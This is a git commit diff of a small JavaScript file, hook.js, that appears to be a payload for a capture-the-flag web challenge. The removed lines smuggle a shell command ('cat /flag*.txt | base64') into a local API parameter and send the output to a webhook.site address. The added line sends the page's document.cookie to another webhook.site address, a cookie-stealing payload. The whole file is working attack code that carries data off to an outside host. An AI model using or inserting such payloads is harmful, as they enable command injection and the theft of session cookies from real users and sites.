a201cdf4f79e11bc676dd47191db9fcfd58aaeef
Allaith Kasem <102862850+Allaith-Kasem@users.noreply.github.com>
2026-05-15 21:17:35 +0400

    Update hook.js

--- hook.js
+++ hook.js
@@ -1,6 +1,1 @@
-(async () => {
-  const res = await fetch("http://127.0.0.1:30507/api/stats?command=cat%20%2Fflag%2A.txt%20%7C%20base64");
-  const text = await res.text();
-
-  await fetch("https://webhook.site/d3afa10a-d033-4e1f-8828-d78132668e48?data=" + encodeURIComponent(text));
-})();
+fetch("https://webhook.site/383e7e0c-b806-4d4a-bc40-609f278ff1a5?data"+document.cookie);
